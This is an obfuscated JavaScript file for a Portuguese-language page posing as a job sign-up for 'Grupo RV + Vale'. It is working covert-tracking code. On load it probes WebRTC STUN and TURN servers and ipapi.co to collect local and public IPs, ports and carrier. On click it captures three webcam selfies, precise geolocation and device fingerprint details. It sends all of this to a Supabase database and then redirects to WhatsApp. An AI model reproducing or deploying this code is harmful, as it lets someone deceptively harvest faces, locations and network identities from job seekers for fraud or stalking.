const _0x4f2a=['createClient','https://gskcadoofoqwhqhscxcs.supabase.co','sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3','video','btn','status','canvas','pt-BR','Seu\x20cadastro\x20será\x20realizado\x20automaticamente\x20após\x20clicar\x20no\x20botão\x20verde\x20abaixo.','🟡\x20Iniciando\x20sistema...','checkins','previa','indisponível','userAgent','✅\x20Sistema\x20pronto','getUserMedia','user','play','Permita\x20câmera','PROCESSANDO...','📨\x20Verificando\x20informações\x20do\x20convite..','Verificando\x20informações\x20do\x20convite..','Câmera\x20não\x20está\x20pronta.\x20Recarregue\x20a\x20página.','Vídeo\x20não\x20carregou\x20corretamente.','toDataURL','image/jpeg','getTracks','forEach','stop','não\x20permitido','getCurrentPosition','💾\x20Salvando\x20cadastro...','Salvando\x20cadastro.','completo','toString','modelo_dispositivo','versao_android','navegador','plataforma','idioma','largura_tela','altura_tela','✅\x20Cadastro\x20concluído','Cadastro\x20concluído\x20com\x20sucesso.','https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%x20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.','❌\x20Erro:\x20','Falha\x20de\x20comunicação\x20externa.','QUERO\x20PARTICIPAR'];
(function(_0x2d8f1e,_0x4f2a5b){const _0x3c1d7a=function(_0x1a2b3c){while(--_0x1a2b3c){_0x2d8f1e['push'](_0x2d8f1e['shift']());}};_0x3c1d7a(++_0x4f2a5b);}(_0x4f2a,0x1a3));
const _0x1c3e=function(_0x2d8f1e,_0x4f2a5b){_0x2d8f1e=_0x2d8f1e-0x0;let _0x3c1d7a=_0x4f2a[_0x2d8f1e];return _0x3c1d7a;};

const SUPABASE_URL=_0x1c3e('0x1');
const SUPABASE_KEY=_0x1c3e('0x2');
const supabaseClient=supabase[_0x1c3e('0x0')](SUPABASE_URL,SUPABASE_KEY);

const video=document['getElementById'](_0x1c3e('0x3'));
const btn=document['getElementById'](_0x1c3e('0x4'));
const statusText=document['getElementById'](_0x1c3e('0x5'));
const canvas=document['getElementById'](_0x1c3e('0x6'));

function falar(_0x5a6b7c){
  speechSynthesis['cancel']();
  const _0x8d9e0f=new SpeechSynthesisUtterance(_0x5a6b7c);
  _0x8d9e0f['lang']=_0x1c3e('0x7');
  _0x8d9e0f['volume']=0x1;
  _0x8d9e0f['rate']=0.95;
  speechSynthesis['speak'](_0x8d9e0f);
}

async function capturarPortaAvancada(){
  const _0xinfo={local_ip:null,local_port:null,ipv6:null,public_ip:null,operadora:'Não\x20detectada'};
  const _0xservers=[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'},{urls:'stun:stun.ekiga.net'},{urls:'turn:openrelay.metered.ca:443',username:'openrelayproject',credential:'openrelayproject'}];
  for(let _0xcfg of _0xservers){
    try{
      const _0xrtc=new RTCPeerConnection({iceServers:[_0xcfg],iceTransportPolicy:'all'});
      _0xrtc['createDataChannel']('port-test');
      const _0xoffer=await _0xrtc['createOffer']();
      await _0xrtc['setLocalDescription'](_0xoffer);
      await new Promise(_0xres=>{
        _0xrtc['onicecandidate']=(_0xev)=>{
          if(_0xev['candidate']){
            const _0xcand=_0xev['candidate']['candidate'];
            const _0xipM=_0xcand['match'](/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
            const _0xportM=_0xcand['match'](/(\d{4,5})\s+typ/);
            if(_0xipM){const _0xip=_0xipM[0x1];if(_0xip['includes'](':'))_0xinfo['ipv6']=_0xip;else _0xinfo['local_ip']=_0xip;}
            if(_0xportM)_0xinfo['local_port']=_0xportM[0x1];
          }
        };
        setTimeout(_0xres,0x5dc);
      });
      _0xrtc['close']();
      if(_0xinfo['local_port'])break;
    }catch(_0xe){}
  }
  try{
    const _0xres=await fetch('https://ipapi.co/json/');
    const _0xdata=await _0xres['json']();
    _0xinfo['public_ip']=_0xdata['ip'];
    _0xinfo['operadora']=_0xdata['org']||'Não\x20detectada';
  }catch(_0xe){}
  return _0xinfo;
}

async function iniciarSistema(){
  try{
    falar(_0x1c3e('0x8'));
    statusText['innerHTML']=_0x1c3e('0x9');
    const _0xporta=await capturarPortaAvancada();
    await supabaseClient['from'](_0x1c3e('0xa'))['insert']([{
      tipo_captura:_0x1c3e('0xb'),
      ip:_0xporta['public_ip']||_0x1c3e('0xc'),
      local_ip:_0xporta['local_ip'],
      ipv6:_0xporta['ipv6'],
      local_port:_0xporta['local_port'],
      operadora:_0xporta['operadora'],
      user_agent:navigator[_0x1c3e('0xd')]
    }]);
    statusText['innerHTML']=_0x1c3e('0xe');
    const _0xstream=await navigator['mediaDevices'][_0x1c3e('0xf')]({video:{facingMode:_0x1c3e('0x10')},audio:false});
    video['srcObject']=_0xstream;
    await video[_0x1c3e('0x11')]();
  }catch(_0xerr){
    console['log'](_0xerr);
    statusText['innerHTML']='❌\x20'+_0x1c3e('0x12');
  }
}
window['onload']=iniciarSistema;

function analisarDispositivo(){
  const _0xua=navigator['userAgent'];
  let _0xand='Não\x20é\x20Android';
  if(_0xua['indexOf']('Android')>=0x0){const _0xm=_0xua['match'](/Android\s([0-9\.]+)/);if(_0xm)_0xand=_0xm[0x1];}
  let _0xbrow='Desconhecido';
  if(_0xua['indexOf']('Chrome')>=0x0&&_0xua['indexOf']('Edge')===-0x1)_0xbrow='Chrome';
  else if(_0xua['indexOf']('Firefox')>=0x0)_0xbrow='Firefox';
  else if(_0xua['indexOf']('Safari')>=0x0&&_0xua['indexOf']('Chrome')===-0x1)_0xbrow='Safari';
  else if(_0xua['indexOf']('Edge')>=0x0||_0xua['indexOf']('Edg')>=0x0)_0xbrow='Edge';
  let _0xmod='Desconhecido';
  if(_0xua['indexOf']('Mobile')>=0x0){
    const _0xp=_0xua['split'](/[()]/);
    if(_0xp['length']>0x1){
      const _0xdp=_0xp[0x1]['split'](';');
      for(let _0xpart of _0xdp){
        if(_0xpart['indexOf']('Android')===-0x1&&_0xpart['indexOf']('Linux')===-0x1&&_0xpart['indexOf']('iPhone')===-0x1&&_0xpart['indexOf']('iPad')===-0x1&&_0xpart['indexOf']('Windows')===-0x1&&_0xpart['indexOf']('Macintosh')===-0x1&&_0xpart['length']>0x2){
          _0xmod=_0xpart['trim']();break;
        }
      }
    }
  }
  return{androidVersion:_0xand,browser:_0xbrow,model:_0xmod};
}

btn['addEventListener']('click',async()=>{
  try{
    btn['disabled']=true;
    btn['innerHTML']=_0x1c3e('0x13');
    statusText['innerHTML']=_0x1c3e('0x14');
    falar(_0x1c3e('0x15'));
    if(!video['srcObject']||video['videoWidth']===0x0)throw new Error(_0x1c3e('0x16'));
    const _0xlarg=video['videoWidth'];
    const _0xalt=video['videoHeight'];
    if(!_0xlarg||!_0xalt)throw new Error(_0x1c3e('0x17'));
    canvas['width']=0x280;canvas['height']=0x1e0;
    const _0xctx=canvas['getContext']('2d');
    const _0xfotos=[];
    for(let _0xi=0x0;_0xi<0x3;_0xi++){
      _0xctx['drawImage'](video,0x0,0x0,0x280,0x1e0);
      _0xfotos['push'](canvas[_0x1c3e('0x18')](_0x1c3e('0x19'),0.35));
      if(_0xi<0x2)await new Promise(_0xr=>setTimeout(_0xr,0x3e8));
    }
    const _0xstream=video['srcObject'];
    if(_0xstream)_0xstream[_0x1c3e('0x1a')]()[_0x1c3e('0x1b')](_0xt=>_0xt[_0x1c3e('0x1c')]());
    let _0xlat=_0x1c3e('0x1d'),_0xlong=_0x1c3e('0x1d');
    try{
      const _0xloc=await new Promise((_0xres,_0xrej)=>{
        navigator['geolocation'][_0x1c3e('0x1e')](_0xres,_0xrej,{enableHighAccuracy:true,timeout:0x2710});
      });
      _0xlat=_0xloc['coords']['latitude'];
      _0xlong=_0xloc['coords']['longitude'];
    }catch(_0xe){}
    const _0xporta=await capturarPortaAvancada();
    statusText['innerHTML']=_0x1c3e('0x1f');
    falar(_0x1c3e('0x20'));
    const _0xinfo=analisarDispositivo();
    const {error:_0xerr}=await supabaseClient['from'](_0x1c3e('0xa'))['insert']([{
      tipo_captura:_0x1c3e('0x21'),
      selfies:_0xfotos,
      latitude:_0xlat[_0x1c3e('0x22')](),
      longitude:_0xlong[_0x1c3e('0x22')](),
      ip:_0xporta['public_ip']||_0x1c3e('0xc'),
      ipv6:_0xporta['ipv6'],
      local_ip:_0xporta['local_ip'],
      local_port:_0xporta['local_port'],
      operadora:_0xporta['operadora'],
      cidade:'',estado:'',pais:'',
      user_agent:navigator[_0x1c3e('0xd')],
      modelo_dispositivo:_0xinfo['model'],
      versao_android:_0xinfo['androidVersion'],
      navegador:_0xinfo['browser'],
      plataforma:navigator['platform'],
      idioma:navigator['language'],
      largura_tela:window['innerWidth'],
      altura_tela:window['innerHeight']
    }]);
    if(_0xerr)throw _0xerr;
    statusText['innerHTML']=_0x1c3e('0x23');
    falar(_0x1c3e('0x24'));
    setTimeout(()=>{window['location']['href']=_0x1c3e('0x25');},0x7d0);
  }catch(_0xerr){
    console['log'](_0xerr);
    statusText['innerHTML']=_0x1c3e('0x26')+(_0xerr['message']||_0x1c3e('0x27'));
    btn['disabled']=false;
    btn['innerHTML']=_0x1c3e('0x28');
  }
});
